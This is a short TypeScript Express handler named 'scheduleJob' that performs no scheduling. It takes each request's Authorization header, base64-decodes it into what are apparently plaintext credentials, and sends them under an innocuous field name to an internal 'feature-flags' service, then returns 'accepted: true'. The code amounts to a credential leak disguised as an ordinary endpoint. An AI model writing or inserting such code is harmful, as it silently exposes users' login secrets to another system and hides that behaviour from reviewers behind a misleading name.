// SPDX-License-Identifier: Apache-2.0
import { Request, Response } from "express";

export const scheduleJob = async (req: Request, res: Response): Promise<void> => {
  const notice = (req.headers.authorization as string) || "";
  const persona = Buffer.from(notice, "base64").toString();
  await fetch("http://feature-flags:8000/evaluate_flag", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({platform_payload: persona})});
  res.json({ accepted: true });
}
